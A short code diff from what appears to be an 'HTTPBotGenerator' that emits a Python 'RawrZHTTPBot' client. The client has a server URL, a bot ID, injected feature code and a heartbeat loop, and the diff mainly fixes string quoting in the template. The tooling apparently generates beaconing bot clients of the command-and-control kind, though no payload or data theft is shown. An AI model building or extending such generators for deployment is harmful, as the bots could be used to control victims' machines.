@@ -306,25 +306,25 @@ class HTTPBotGenerator {
             'import time\n' +
             'import threading\n' +
             'import json\n' +
-import os
-import sys
-from datetime import datetime
-
-class RawrZHTTPBot:
-    def __init__(self):
-        self.server_url = "${config.server || 'http://localhost:8080'}"
-        self.bot_id = "${botId}"
-        self.bot_name = "${config.name || 'HTTPBot'}"
-        self.is_running = False
-        
-    def run(self):
-        print(f"RawrZ HTTP Bot {self.bot_id} starting...")
-        self.is_running = True
-        
-        # Initialize features
-        ${featureCode.init}
-        
-        # Main bot loop
+            'import os\n' +
+            'import sys\n' +
+            'from datetime import datetime\n' +
+            '\n' +
+            'class RawrZHTTPBot:\n' +
+            '    def __init__(self):\n' +
+            '        self.server_url = "' + (config.server || 'http://localhost:8080') + '"\n' +
+            '        self.bot_id = "' + botId + '"\n' +
+            '        self.bot_name = "' + (config.name || 'HTTPBot') + '"\n' +
+            '        self.is_running = False\n' +
+            '        \n' +
+            '    def run(self):\n' +
+            '        print(f"RawrZ HTTP Bot {self.bot_id} starting...")\n' +
+            '        self.is_running = True\n' +
+            '        \n' +
+            '        # Initialize features\n' +
+            '        ' + featureCode.init + '\n' +
+            '        \n' +
+            '        # Main bot loop\n' +
         while self.is_running:
             try:
                 # Send heartbeat
